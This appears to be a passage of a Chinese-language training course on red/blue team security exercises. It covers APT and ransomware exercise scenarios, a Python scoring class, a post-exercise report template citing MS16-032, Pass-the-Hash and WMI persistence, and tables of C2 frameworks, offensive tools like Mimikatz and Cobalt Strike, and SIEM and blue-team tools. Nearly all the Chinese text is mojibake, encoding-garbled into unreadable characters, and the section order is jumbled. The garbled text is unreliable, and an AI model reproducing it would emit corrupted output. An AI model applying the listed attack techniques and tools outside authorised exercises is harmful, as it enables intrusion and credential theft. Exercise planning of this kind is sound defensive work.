å½±å“ï¼šæ¼”ç»ƒæœŸé—´å¯èƒ½å‡ºç°ç™»å½•å‘Šè­¦ã€é‚®ä»¶é€šçŸ¥ï¼Œè¯·æŒ‰ç…§æŒ‡å¼•åé¦ˆ
åº”å¯¹ï¼šå¦‚é‡å¼‚å¸¸è¯·åŠæ—¶è”ç³»SOCï¼ˆsoc@corp.com / 400-xxx-xxxxï¼‰
è¯´æ˜ï¼šæœ¬æ¬¡æ¼”ç»ƒå·²è·å¾—æˆæƒï¼Œä¸ä¼šå½±å“ç”Ÿäº§æ•°æ®å®‰å…¨ã€‚å¦‚æœ‰ç–‘é—®è¯·è”ç³»ç™½é˜Ÿè´Ÿè´£äººã€‚
</code></pre>
<h3 id="56-æ¼”ç»ƒæŠ¥å‘Šé€ŸæŸ¥è¡¨"><a class="header" href="#56-æ¼”ç»ƒæŠ¥å‘Šé€ŸæŸ¥è¡¨">5.6 æ¼”ç»ƒæŠ¥å‘Šé€ŸæŸ¥è¡¨</a></h3>
<ul>
<li><code>Executive Summary</code>ï¼šæ•´ä½“ç›®æ ‡ã€æˆæ•ˆã€è¯„åˆ†ã€å…³é”®é£é™©ã€‚</li>
<li><code>Findings Table</code>ï¼šé«˜/ä¸­/ä½é£é™©åˆ—è¡¨ã€å½±å“ã€å»ºè®®ã€è´Ÿè´£äººã€æˆªæ­¢æ—¶é—´ã€‚</li>
<li><code>Attack Path</code>ï¼šå›¾å½¢åŒ–å±•ç¤ºæ”»å‡»é“¾ï¼ˆå·¥å…·ï¼šdraw.ioã€PowerPointã€Obsidian Canvasï¼‰ã€‚</li>
<li><code>Detection &amp; Response Timeline</code>ï¼šå›¾è¡¨å±•ç¤ºMTTDã€MTTRã€å…³é”®å‘Šè­¦ã€‚</li>
<li><code>Improvement Backlog</code>ï¼šè¡ŒåŠ¨é¡¹ç¼–å·ã€æè¿°ã€è´£ä»»äººã€ç›®æ ‡æ—¥æœŸã€çŠ¶æ€ã€‚</li>
<li><code>Appendix</code>ï¼šæ—¥å¿—æ ·æœ¬ã€æˆªå›¾ã€å‘½ä»¤ã€å“ˆå¸Œå€¼ã€å‚è€ƒèµ„æ–™ã€‚</li>
</ul>
<h3 id="52-åœºæ™¯è®¾è®¡"><a class="header" href="#52-åœºæ™¯è®¾è®¡">5.2 åœºæ™¯è®¾è®¡</a></h3>
<h4 id="aptæ”»å‡»æ¨¡æ‹Ÿåœºæ™¯"><a class="header" href="#aptæ”»å‡»æ¨¡æ‹Ÿåœºæ™¯">APTæ”»å‡»æ¨¡æ‹Ÿåœºæ™¯</a></h4>
<p><strong>æ”»å‡»é“¾è®¾è®¡</strong>:</p>
<pre><code>åœºæ™¯: APTç»„ç»‡é’ˆå¯¹æ€§æ”»å‡»

ç¬¬1å¤© - ä¾¦å¯Ÿé˜¶æ®µ:
â”œâ”€â”€ OSINTä¿¡æ¯æ”¶é›†
â”œâ”€â”€ å­åŸŸåæšä¸¾
â”œâ”€â”€ ç¤¾äº¤åª’ä½“æƒ…æŠ¥
â””â”€â”€ é‚®ç®±åœ°å€æ”¶é›†

ç¬¬2-3å¤© - åˆå§‹è®¿é—®:
â”œâ”€â”€ é’“é±¼é‚®ä»¶å‘é€
â”œâ”€â”€ æ°´å‘æ”»å‡»éƒ¨ç½²
â”œâ”€â”€ VPNæš´åŠ›ç ´è§£
â””â”€â”€ ä¾›åº”é“¾æŠ•æ¯’

ç¬¬4-5å¤© - ç«‹è¶³ç‚¹å»ºç«‹:
â”œâ”€â”€ Webshellä¸Šä¼ 
â”œâ”€â”€ Beaconéƒ¨ç½²
â”œâ”€â”€ æƒé™æå‡
â””â”€â”€ æŒä¹…åŒ–æœºåˆ¶

ç¬¬6-7å¤© - å†…ç½‘æ¸—é€:
â”œâ”€â”€ å‡­è¯è·å–
â”œâ”€â”€ æ¨ªå‘ç§»åŠ¨
â”œâ”€â”€ åŸŸæ§æ¸—é€
â””â”€â”€ æ•°æ®çªƒå–

è¯„åˆ†æ ‡å‡†:
- çº¢é˜ŸæˆåŠŸçªç ´: 10åˆ†/é˜¶æ®µ
- è“é˜ŸæˆåŠŸæ£€æµ‹: -5åˆ†/æ¬¡
- è“é˜ŸæˆåŠŸéåˆ¶: -10åˆ†/æ¬¡
- æœªè¢«å‘ç°å®Œæˆä»»åŠ¡: é¢å¤–20åˆ†
</code></pre>
<p><strong>è“é˜Ÿå“åº”åœºæ™¯</strong>:</p>
<pre><code>åœºæ™¯: å‹’ç´¢è½¯ä»¶æ”»å‡»å“åº”

T+0åˆ†é’Ÿ - æ£€æµ‹:
â””â”€â”€ SIEMå‘Šè­¦è§¦å‘ï¼ˆå¼‚å¸¸åŠ å¯†è¡Œä¸ºï¼‰

T+15åˆ†é’Ÿ - åˆæ­¥å“åº”:
â”œâ”€â”€ éš”ç¦»å—æ„ŸæŸ“ä¸»æœº
â”œâ”€â”€ é€šçŸ¥å“åº”å›¢é˜Ÿ
â””â”€â”€ è®°å½•åˆå§‹ä¿¡æ¯

T+1å°æ—¶ - æ·±å…¥åˆ†æ:
â”œâ”€â”€ ç¡®å®šæ„ŸæŸ“èŒƒå›´
â”œâ”€â”€ è¯†åˆ«åˆå§‹å…¥ä¾µç‚¹
â”œâ”€â”€ æå–æ¶æ„æ ·æœ¬
â””â”€â”€ é˜»æ–­C2é€šä¿¡

T+4å°æ—¶ - éåˆ¶æ ¹é™¤:
â”œâ”€â”€ éš”ç¦»æ‰€æœ‰å—å½±å“ç³»ç»Ÿ
â”œâ”€â”€ é‡ç½®è¢«ç›—å‡­è¯
â”œâ”€â”€ ä¿®è¡¥æ¼æ´
â””â”€â”€ æ¸…ç†æ¶æ„è½¯ä»¶

T+24å°æ—¶ - æ¢å¤:
â”œâ”€â”€ ä»å¤‡ä»½æ¢å¤æ•°æ®
â”œâ”€â”€ é‡å»ºå—æ„ŸæŸ“ç³»ç»Ÿ
â””â”€â”€ éªŒè¯å®Œæ•´æ€§

T+1å‘¨ - å¤ç›˜:
â”œâ”€â”€ ç¼–å†™äº‹ä»¶æŠ¥å‘Š
â”œâ”€â”€ æ›´æ–°æ£€æµ‹è§„åˆ™
â””â”€â”€ å›¢é˜ŸåŸ¹è®­

è¯„åˆ†æ ‡å‡†:
- 15åˆ†é’Ÿå†…éš”ç¦»: 100åˆ†
- 1å°æ—¶å†…ç¡®å®šèŒƒå›´: 80åˆ†
- 4å°æ—¶å†…éåˆ¶å¨èƒ: 60åˆ†
- 24å°æ—¶å†…æ¢å¤ä¸šåŠ¡: 40åˆ†
</code></pre>
<h3 id="53-æ•ˆæœè¯„ä¼°"><a class="header" href="#53-æ•ˆæœè¯„ä¼°">5.3 æ•ˆæœè¯„ä¼°</a></h3>
<p><strong>è¯„ä¼°æŒ‡æ ‡ä½“ç³»</strong>:</p>
<pre><code class="language-python">class RedBlueMetrics:
    def __init__(self):
        self.metrics = {
            'red_team': {
                'ttc': 0,  # Time to Compromise (çªç ´æ—¶é—´)
                'ttp': 0,  # Time to Privilege (ææƒæ—¶é—´)
                'ttd': 0,  # Time to Domain (åŸŸæ§æ—¶é—´)
                'detection_rate': 0,  # è¢«æ£€æµ‹ç‡
                'techniques_used': [],  # ä½¿ç”¨çš„æŠ€æœ¯
                'success_rate': 0  # æˆåŠŸç‡
            },
            'blue_team': {
                'ttd': 0,  # Time to Detect (æ£€æµ‹æ—¶é—´)
                'ttr': 0,  # Time to Respond (å“åº”æ—¶é—´)
                'ttc': 0,  # Time to Contain (éåˆ¶æ—¶é—´)
                'tte': 0,  # Time to Eradicate (æ ¹é™¤æ—¶é—´)
                'false_positive_rate': 0,  # è¯¯æŠ¥ç‡
                'coverage': 0  # è¦†ç›–ç‡
            }
        }

    def calculate_red_team_score(self):
        """
        è®¡ç®—çº¢é˜Ÿå¾—åˆ†
        """
        score = 0

        # çªç ´é€Ÿåº¦å¾—åˆ†ï¼ˆè¶Šå¿«è¶Šé«˜ï¼‰
        if self.metrics['red_team']['ttc'] &lt; 3600:  # 1å°æ—¶
            score += 50
        elif self.metrics['red_team']['ttc'] &lt; 86400:  # 1å¤©
            score += 30
        else:
            score += 10

        # éšè”½æ€§å¾—åˆ†
        detection_penalty = self.metrics['red_team']['detection_rate'] * 10
        score -= detection_penalty

        # æŠ€æœ¯å¤šæ ·æ€§å¾—åˆ†
        techniques_bonus = len(self.metrics['red_team']['techniques_used']) * 2
        score += techniques_bonus

        return max(0, score)

    def calculate_blue_team_score(self):
        """
        è®¡ç®—è“é˜Ÿå¾—åˆ†
        """
        score = 0

        # æ£€æµ‹é€Ÿåº¦å¾—åˆ†
        if self.metrics['blue_team']['ttd'] &lt; 300:  # 5åˆ†é’Ÿ
            score += 50
        elif self.metrics['blue_team']['ttd'] &lt; 1800:  # 30åˆ†é’Ÿ
            score += 30
        else:
            score += 10

        # å“åº”æ•ˆç‡å¾—åˆ†
        total_response_time = (
            self.metrics['blue_team']['ttr'] +
            self.metrics['blue_team']['ttc'] +
            self.metrics['blue_team']['tte']
        )

        if total_response_time &lt; 3600:  # 1å°æ—¶
            score += 40
        elif total_response_time &lt; 14400:  # 4å°æ—¶
            score += 20

        # å‡†ç¡®æ€§å¾—åˆ†
        accuracy_bonus = (1 - self.metrics['blue_team']['false_positive_rate']) * 30
        score += accuracy_bonus

        return score

    def generate_report(self):
        """
        ç”Ÿæˆè¯„ä¼°æŠ¥å‘Š
        """
        red_score = self.calculate_red_team_score()
        blue_score = self.calculate_blue_team_score()

        report = f"""
# çº¢è“å¯¹æŠ—æ¼”ç»ƒè¯„ä¼°æŠ¥å‘Š

## çº¢é˜Ÿè¡¨ç°
- ç»¼åˆå¾—åˆ†: {red_score}/100
- çªç ´ç”¨æ—¶: {self.metrics['red_team']['ttc']}ç§’
- ææƒç”¨æ—¶: {self.metrics['red_team']['ttp']}ç§’
- è¢«æ£€æµ‹ç‡: {self.metrics['red_team']['detection_rate']*100}%
- ä½¿ç”¨æŠ€æœ¯: {len(self.metrics['red_team']['techniques_used'])}ç§

## è“é˜Ÿè¡¨ç°
- ç»¼åˆå¾—åˆ†: {blue_score}/100
- å¹³å‡æ£€æµ‹æ—¶é—´: {self.metrics['blue_team']['ttd']}ç§’
- å¹³å‡å“åº”æ—¶é—´: {self.metrics['blue_team']['ttr']}ç§’
- å¹³å‡éåˆ¶æ—¶é—´: {self.metrics['blue_team']['ttc']}ç§’
- è¯¯æŠ¥ç‡: {self.metrics['blue_team']['false_positive_rate']*100}%

## å¯¹æŠ—ç»“æœ
{"çº¢é˜Ÿè·èƒœ" if red_score &gt; blue_score else "è“é˜Ÿè·èƒœ"}
        """

        return report
</code></pre>
<h3 id="54-å¤ç›˜æ€»ç»“"><a class="header" href="#54-å¤ç›˜æ€»ç»“">5.4 å¤ç›˜æ€»ç»“</a></h3>
<p><strong>å¤ç›˜æ¡†æ¶</strong>:</p>
<pre><code class="language-markdown"># çº¢è“å¯¹æŠ—æ¼”ç»ƒå¤ç›˜æŠ¥å‘Š

## 1. æ‰§è¡Œæ‘˜è¦
- æ¼”ç»ƒæ—¶é—´: 2024å¹´XæœˆXæ—¥ - XæœˆXæ—¥
- å‚æ¼”äººå‘˜: çº¢é˜Ÿ5äººï¼Œè“é˜Ÿ8äººï¼Œç™½é˜Ÿ2äºº
- æ¼”ç»ƒèŒƒå›´: XXç³»ç»Ÿã€XXç½‘ç»œ
- ä¸»è¦å‘ç°: Xä¸ªé«˜å±æ¼æ´ï¼ŒXä¸ªä¸­å±æ¼æ´

## 2. çº¢é˜Ÿæˆ˜æœ¯åˆ†æ

### 2.1 æˆåŠŸæˆ˜æœ¯
- âœ… é’“é±¼é‚®ä»¶æˆåŠŸç‡: 30% (å‘é€100å°ï¼ŒæˆåŠŸ30æ¬¡)
- âœ… æƒé™æå‡: åˆ©ç”¨MS16-032æˆåŠŸæå‡è‡³SYSTEM
- âœ… æ¨ªå‘ç§»åŠ¨: Pass-the-Hashæ”»å‡»æˆåŠŸç§»åŠ¨åˆ°5å°ä¸»æœº
- âœ… æŒä¹…åŒ–: WMIäº‹ä»¶è®¢é˜…æŒä¹…åŒ–æœªè¢«å‘ç°

### 2.2 å¤±è´¥æˆ˜æœ¯
- âŒ Mimikatzæ‰§è¡Œè¢«EDRæ‹¦æˆª
- âŒ ç«¯å£æ‰«æè§¦å‘IDSå‘Šè­¦
- âŒ C2é€šä¿¡è¢«é˜²ç«å¢™é˜»æ–­

### 2.3 æ”»å‡»æ—¶é—´çº¿
</code></pre>
<p>Day 1:
09:00 - å¼€å§‹OSINTæ”¶é›†
14:00 - å‘ç°å­åŸŸåtakeoveræ¼æ´
18:00 - æˆåŠŸè·å¾—åˆå§‹è®¿é—®</p>
<p>Day 2:
10:00 - éƒ¨ç½²Cobalt Strike Beacon
12:00 - æƒé™æå‡è‡³SYSTEM
15:00 - æå–æœ¬åœ°å‡­è¯
18:00 - æ¨ªå‘ç§»åŠ¨åˆ°è·³æ¿æœº</p>
<p>Day 3:
09:00 - ç»§ç»­æ¨ªå‘ç§»åŠ¨
14:00 - æ¥è¿‘åŸŸæ§åˆ¶å™¨
16:00 - è¢«è“é˜Ÿå‘ç°å¹¶éåˆ¶</p>
<pre><code>
## 3. è“é˜Ÿé˜²å¾¡åˆ†æ

### 3.1 æ£€æµ‹æˆåŠŸæ¡ˆä¾‹
- âœ… SIEMæ£€æµ‹åˆ°å¼‚å¸¸PowerShellæ´»åŠ¨ï¼ˆT+2å°æ—¶ï¼‰
- âœ… EDRæ‹¦æˆªMimikatzæ‰§è¡Œï¼ˆT+1å¤©ï¼‰
- âœ… ç½‘ç»œç›‘æ§å‘ç°å¼‚å¸¸å¤–è”ï¼ˆT+2å¤©ï¼‰

### 3.2 æ£€æµ‹å¤±è´¥æ¡ˆä¾‹
- âŒ é’“é±¼é‚®ä»¶æœªè¢«è¯†åˆ«
- âŒ WMIæŒä¹…åŒ–æœªè¢«æ£€æµ‹
- âŒ é¦–æ¬¡æ¨ªå‘ç§»åŠ¨æœªå‘Šè­¦

### 3.3 å“åº”æ—¶é—´çº¿
</code></pre>
<p>T+2å°æ—¶: é¦–æ¬¡å‘Šè­¦ï¼ˆPowerShellå¼‚å¸¸ï¼‰
T+2å°æ—¶15åˆ†: å®‰å…¨åˆ†æå¸ˆå¼€å§‹è°ƒæŸ¥
T+3å°æ—¶: ç¡®è®¤ä¸ºçº¢é˜Ÿæ´»åŠ¨
T+4å°æ—¶: å¼€å§‹éåˆ¶æªæ–½
T+1å¤©: å®Œå…¨éåˆ¶å¨èƒ</p>
<pre><code>
## 4. å‘ç°çš„å®‰å…¨é—®é¢˜

### 4.1 é«˜å±é—®é¢˜
1. **æœªä¿®è¡¥çš„ç³»ç»Ÿæ¼æ´** (ä¸¥é‡)
   - å½±å“: 10å°æœåŠ¡å™¨å­˜åœ¨MS16-032æ¼æ´
   - å»ºè®®: ç«‹å³å®‰è£…å®‰å…¨è¡¥ä¸
   - è´£ä»»äºº: ç³»ç»Ÿç®¡ç†å‘˜
   - ä¿®å¤æœŸé™: 1å‘¨å†…

2. **å¼±å¯†ç ç­–ç•¥** (é«˜å±)
   - å½±å“: 30%è´¦æˆ·ä½¿ç”¨å¼±å¯†ç 
   - å»ºè®®: å¼ºåˆ¶å¤æ‚å¯†ç ç­–ç•¥
   - è´£ä»»äºº: ADç®¡ç†å‘˜
   - ä¿®å¤æœŸé™: 2å‘¨å†…

### 4.2 ä¸­å±é—®é¢˜
1. **ç¼ºå°‘å¤šå› ç´ è®¤è¯**
   - å½±å“: VPNå’Œç®¡ç†åå°æœªå¯ç”¨MFA
   - å»ºè®®: éƒ¨ç½²MFAè§£å†³æ–¹æ¡ˆ
   - è´£ä»»äºº: å®‰å…¨å›¢é˜Ÿ
   - ä¿®å¤æœŸé™: 1ä¸ªæœˆ

2. **æ—¥å¿—ç•™å­˜ä¸è¶³**
   - å½±å“: ä»…ä¿ç•™7å¤©æ—¥å¿—
   - å»ºè®®: å»¶é•¿è‡³90å¤©
   - è´£ä»»äºº: è¿ç»´å›¢é˜Ÿ
   - ä¿®å¤æœŸé™: 2å‘¨å†…

## 5. æ”¹è¿›å»ºè®®

### 5.1 æŠ€æœ¯å±‚é¢
- [ ] éƒ¨ç½²EDRåˆ°æ‰€æœ‰ç»ˆç«¯
- [ ] æ›´æ–°SIEMæ£€æµ‹è§„åˆ™
- [ ] å®æ–½ç½‘ç»œåˆ†æ®µ
- [ ] å¯ç”¨LSAä¿æŠ¤
- [ ] éƒ¨ç½²æ¬ºéª—æŠ€æœ¯ï¼ˆHoneypotï¼‰

### 5.2 æµç¨‹å±‚é¢
- [ ] å»ºç«‹åº”æ€¥å“åº”æ‰‹å†Œ
- [ ] å®šæœŸå®‰å…¨åŸ¹è®­
- [ ] æ¼æ´ç®¡ç†æµç¨‹
- [ ] å˜æ›´ç®¡ç†åŠ å›º

### 5.3 äººå‘˜å±‚é¢
- [ ] å¢åŠ å®‰å…¨åˆ†æå¸ˆ
- [ ] å¨èƒç‹©çŒåŸ¹è®­
- [ ] çº¢è“å¯¹æŠ—å®šæœŸåŒ–

## 6. ä¸‹æ¬¡æ¼”ç»ƒè®¡åˆ’
- æ—¶é—´: 3ä¸ªæœˆå
- é‡ç‚¹: éªŒè¯æ”¹è¿›æªæ–½æœ‰æ•ˆæ€§
- æ–°å¢åœºæ™¯: ä¾›åº”é“¾æ”»å‡»æ¨¡æ‹Ÿ
</code></pre>
<hr />
<h2 id="æ¨¡å—å…­å·¥å…·å¹³å°ä¸è‡ªåŠ¨åŒ–"><a class="header" href="#æ¨¡å—å…­å·¥å…·å¹³å°ä¸è‡ªåŠ¨åŒ–">æ¨¡å—å…­ï¼šå·¥å…·å¹³å°ä¸è‡ªåŠ¨åŒ–</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆå·¥å…·è§†è§’"><a class="header" href="#æ¨¡å—æ€»è§ˆå·¥å…·è§†è§’">æ¨¡å—æ€»è§ˆï¼ˆå·¥å…·è§†è§’ï¼‰</a></h3>
<ul>
<li><strong>ç›®æ ‡</strong>ï¼šæ­å»ºçº¢è“å¯¹æŠ—å…¨é“¾è·¯å·¥å…·ç”Ÿæ€ï¼Œè¦†ç›–æƒ…æŠ¥æ”¶é›†ã€æ”»å‡»æ‰§è¡Œã€æ£€æµ‹å“åº”ã€å–è¯å¤ç›˜ä¸è‡ªåŠ¨åŒ–ç¼–æ’ã€‚</li>
<li><strong>ç­–ç•¥</strong>ï¼šå¼€æº + å•†ä¸š + è‡ªç ”ç»„åˆï¼Œéµå¾ªâ€œå®‰å…¨ã€å¯æ§ã€å¯å®¡è®¡â€åŸåˆ™ï¼Œç¡®ä¿å·¥å…·ä½¿ç”¨åˆè§„å¹¶å½¢æˆèµ„äº§ç®¡ç†ã€‚</li>
<li><strong>è¾“å‡º</strong>ï¼š
<ul>
<li>å·¥å…·èƒ½åŠ›çŸ©é˜µï¼ˆåŠŸèƒ½ã€æˆæœ¬ã€é€‚ç”¨åœºæ™¯ã€é£é™©ï¼‰</li>
<li>è‡ªåŠ¨åŒ–æµæ°´çº¿è®¾è®¡ï¼ˆCI/CDã€SOARã€IaCï¼‰</li>
<li>å·¥å…·ç®¡ç†åˆ¶åº¦ï¼ˆè¯„ä¼°ã€å¼•å…¥ã€å‡çº§ã€é€€å½¹ï¼‰</li>
</ul>
</li>
</ul>
<h4 id="å·¥å…·æ²»ç†æµç¨‹"><a class="header" href="#å·¥å…·æ²»ç†æµç¨‹">å·¥å…·æ²»ç†æµç¨‹</a></h4>
<ol>
<li><strong>éœ€æ±‚è¯„ä¼°</strong>ï¼šè¯†åˆ«å·¥å…·ç”¨é€”ã€é€‚é…åœºæ™¯ã€æ›¿ä»£æ–¹æ¡ˆã€‚</li>
<li><strong>é£é™©è¯„ä¼°</strong>ï¼šæ£€æŸ¥æˆæƒåè®®ã€ä¾›åº”é“¾å®‰å…¨ã€åŠŸèƒ½é™åˆ¶ã€‚</li>
<li><strong>å¼•å…¥æµ‹è¯•</strong>ï¼šåœ¨éš”ç¦»ç¯å¢ƒæµ‹è¯•åŠŸèƒ½ã€å…¼å®¹æ€§ã€æ—¥å¿—è¾“å‡ºã€‚</li>
<li><strong>ä¸Šçº¿ç™»è®°</strong>ï¼šçº³å…¥CMDBæˆ–å·¥å…·å°è´¦ï¼Œå®šä¹‰è´Ÿè´£äººä¸ç»´æŠ¤å‘¨æœŸã€‚</li>
<li><strong>ä½¿ç”¨ç›‘æ§</strong>ï¼šè®°å½•ä½¿ç”¨æ—¥å¿—ã€æ•°æ®æµå‘ã€æ•æ„Ÿæ“ä½œå®¡æ‰¹ï¼›å…³é”®å·¥å…·å¯ç”¨å¤šå› ç´ è®¤è¯ã€‚</li>
<li><strong>å®šæœŸå¤æ ¸</strong>ï¼šåŠå¹´ä¸€æ¬¡å®‰å…¨è¯„ä¼°ï¼Œç¡®å®šæ˜¯å¦å‡çº§æˆ–é€€å½¹ã€‚</li>
</ol>
<h3 id="61-çº¢é˜Ÿå·¥å…·ç®±"><a class="header" href="#61-çº¢é˜Ÿå·¥å…·ç®±">6.1 çº¢é˜Ÿå·¥å…·ç®±</a></h3>
<p><strong>C2æ¡†æ¶å¯¹æ¯”</strong>:</p>
<pre><code>æ¡†æ¶          | ä¼˜åŠ¿                    | åŠ£åŠ¿
-------------|------------------------|------------------
Cobalt Strike | æˆç†Ÿç¨³å®šã€åŠŸèƒ½å¼ºå¤§        | å•†ä¸šè½¯ä»¶ã€ç‰¹å¾æ˜æ˜¾
Metasploit   | å…è´¹å¼€æºã€æ¨¡å—ä¸°å¯Œ        | æµé‡ç‰¹å¾æ˜æ˜¾
Empire       | PowerShellåŸç”Ÿã€éšè”½æ€§å¥½  | å·²åœæ­¢ç»´æŠ¤
Covenant     | .NETåŸç”Ÿã€çµæ´»æ€§å¼º        | ç¤¾åŒºè¾ƒå°
Sliver       | ç°ä»£åŒ–ã€éšè”½æ€§å¥½          | ç›¸å¯¹è¾ƒæ–°
</code></pre>
<p><strong>æ¨èå·¥å…·ç»„åˆ</strong>:</p>
<pre><code class="language-bash"># ä¿¡æ¯æ”¶é›†
- Amass: å­åŸŸåæšä¸¾
- theHarvester: OSINTæ”¶é›†
- Shodan CLI: äº’è”ç½‘èµ„äº§æœç´¢

# æ¼æ´æ‰«æ
- Nmap: ç«¯å£æœåŠ¡æ‰«æ
- Nuclei: æ¼æ´æ¨¡æ¿æ‰«æ
- Nessus: ç»¼åˆæ¼æ´æ‰«æ

# æ¼æ´åˆ©ç”¨
- Metasploit: ç»¼åˆæ¸—é€æ¡†æ¶
- Impacket: åè®®å·¥å…·é›†
- CrackMapExec: å†…ç½‘æ¸—é€

# åæ¸—é€
- Mimikatz: å‡­è¯æå–
- BloodHound: ADåˆ†æ
- Empire: PowerShellåæ¸—é€

# C2é€šä¿¡
- Cobalt Strike: ä¼ä¸šçº§C2
- Sliver: ç°ä»£åŒ–C2
- Mythic: æ¨¡å—åŒ–C2
</code></pre>
<h3 id="å¯¹æŠ—è‡ªåŠ¨åŒ–æµæ°´çº¿ç¤ºä¾‹"><a class="header" href="#å¯¹æŠ—è‡ªåŠ¨åŒ–æµæ°´çº¿ç¤ºä¾‹">å¯¹æŠ—è‡ªåŠ¨åŒ–æµæ°´çº¿ç¤ºä¾‹</a></h3>
<pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Git ä»“åº“     â”‚ --&gt; â”‚ CI/CD å¹³å°    â”‚ --&gt; â”‚ ç›®æ ‡ç¯å¢ƒ/é¶åœº   â”‚ --&gt; â”‚ SOAR/å‘Šè­¦å¹³å° â”‚
â”‚ (è„šæœ¬/è§„åˆ™) â”‚     â”‚ (GitLab CI) â”‚     â”‚  (IaCéƒ¨ç½²)     â”‚     â”‚  (Cortex/XSOAR)â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚                    â”‚                    â”‚                    â”‚
        â–¼                    â–¼                    â–¼                    â–¼
  ä»£ç è¯„å®¡(PR)      è‡ªåŠ¨æµ‹è¯•/éªŒè¯        è‡ªåŠ¨æ‰§è¡Œæ”»å‡»åœºæ™¯       è‡ªåŠ¨åˆ›å»ºå“åº”å·¥å•
</code></pre>
<p><strong>é˜¶æ®µè¯´æ˜</strong>ï¼š</p>
<ol>
<li><strong>è„šæœ¬/è§„åˆ™ä»“åº“</strong>ï¼šç»Ÿä¸€ç®¡ç†çº¢é˜Ÿæ”»å‡»è„šæœ¬ã€è“é˜Ÿæ£€æµ‹è§„åˆ™ã€SOAR Playbookã€‚æäº¤å‰é¡»é€šè¿‡ä»£ç è§„èŒƒä¸å®‰å…¨å®¡è®¡ã€‚</li>
<li><strong>CI/CDéªŒè¯</strong>ï¼šè¿è¡Œå•å…ƒæµ‹è¯•ã€é™æ€æ‰«æã€åŸå­åŒ–éªŒè¯ï¼ˆInvoke-Atomicï¼‰ã€æ¨¡æ‹Ÿæ•°æ®æµ‹è¯•Sigmaè§„åˆ™ï¼Œè‡ªåŠ¨ç”ŸæˆæŠ¥å‘Šã€‚</li>
<li><strong>é¶åœºéƒ¨ç½²</strong>ï¼šé€šè¿‡Terraform/Ansibleè‡ªåŠ¨åˆ›å»ºæ¼”ç»ƒç¯å¢ƒã€éƒ¨ç½²C2ã€æ¨¡æ‹Ÿèµ„äº§ã€æ—¥å¿—ç®¡é“ã€‚</li>
<li><strong>SOARè”åŠ¨</strong>ï¼šå½“è§„åˆ™è§¦å‘æ—¶è‡ªåŠ¨ç”Ÿæˆå·¥å•ã€æ‰§è¡Œéš”ç¦»è„šæœ¬ã€è§¦å‘å–è¯é‡‡é›†ï¼Œå¹¶åŒæ­¥æ”»é˜²çœ‹æ¿ã€‚</li>
<li><strong>å½’æ¡£ä¸é”€æ¯</strong>ï¼šæ¼”ç»ƒç»“æŸåè‡ªåŠ¨å¯¼å‡ºæ—¥å¿—ã€è¯æ®ï¼Œé”€æ¯ä¸´æ—¶åŸºç¡€è®¾æ–½ï¼Œæ›´æ–°CMDBã€‚</li>
</ol>
<h3 id="62-è“é˜Ÿå·¥å…·ç®±"><a class="header" href="#62-è“é˜Ÿå·¥å…·ç®±">6.2 è“é˜Ÿå·¥å…·ç®±</a></h3>
<p><strong>SIEMå¹³å°å¯¹æ¯”</strong>:</p>
<pre><code>å¹³å°         | ä¼˜åŠ¿                    | åŠ£åŠ¿
------------|------------------------|------------------
Splunk      | åŠŸèƒ½å¼ºå¤§ã€ç”Ÿæ€ä¸°å¯Œ        | ä»·æ ¼æ˜‚è´µ
ELK Stack   | å…è´¹å¼€æºã€å¯å®šåˆ¶æ€§å¼º      | éœ€è¦ç»´æŠ¤
QRadar      | IBMæ”¯æŒã€é›†æˆåº¦é«˜        | ä»·æ ¼é«˜ã€å¤æ‚
ArcSight    | æˆç†Ÿç¨³å®š                | å­¦ä¹ æ›²çº¿é™¡å³­
</code></pre>
<p><strong>æ¨èå·¥å…·ç»„åˆ</strong>:</p>
<pre><code class="language-bash"># æ—¥å¿—æ”¶é›†
- Sysmon: Windowsç³»ç»Ÿç›‘æ§
- Auditd: Linuxå®¡è®¡
- Osquery: è·¨å¹³å°æŸ¥è¯¢
- Beats: è½»é‡çº§é‡‡é›†å™¨

# å¨èƒæ£€æµ‹
- Zeek: ç½‘ç»œæµé‡åˆ†æ
- Suricata: IDS/IPS
- YARA: æ¶æ„è½¯ä»¶æ£€æµ‹
- Sigma: æ£€æµ‹è§„åˆ™æ ‡å‡†

# ç«¯ç‚¹é˜²æŠ¤
- Windows Defender ATP
- CrowdStrike Falcon
- Carbon Black
- SentinelOne

# å¨èƒæƒ…æŠ¥
- MISP: å¨èƒæƒ…æŠ¥å¹³å°
- OpenCTI: å¨èƒæƒ…æŠ¥ç®¡ç†
- AlienVault OTX: ç¤¾åŒºæƒ…æŠ¥

# åº”æ€¥å“åº”
- Volatility: å†…å­˜å–è¯
- Autopsy: ç£ç›˜å–è¯
- Wireshark: æµé‡åˆ†æ
- KAPE: å¿«é€Ÿå–è¯
</code></pre>
<hr />
<h2 id="æ¨¡å—ä¸ƒå­¦ä¹ éªŒè¯ä¸èƒ½åŠ›åº¦é‡"><a class="header" href="#æ¨¡å—ä¸ƒå­¦ä¹ éªŒè¯ä¸èƒ½åŠ›åº¦é‡">æ¨¡å—ä¸ƒï¼šå­¦ä¹ éªŒè¯ä¸èƒ½åŠ›åº¦é‡</a></h2>
<h3 id="æ¨¡å—æ€»è§ˆåº¦é‡è§†è§’"><a class="header" href="#æ¨¡å—æ€»è§ˆåº¦é‡è§†è§’">æ¨¡å—æ€»è§ˆï¼ˆåº¦é‡è§†è§’ï¼‰</a></h3>
<ul>
<li><strong>ç›®çš„</strong>ï¼šæ„å»ºè¦†ç›–ä¸ªäººã€å›¢é˜Ÿã€ç»„ç»‡å±‚é¢çš„èƒ½åŠ›è¯„ä»·ä½“ç³»ï¼Œç¡®ä¿å­¦ä¹ ä¸æ¼”ç»ƒæˆæœå¯é‡åŒ–ã€å¯è¿½è¸ªã€å¯å¤ç”¨ã€‚</li>
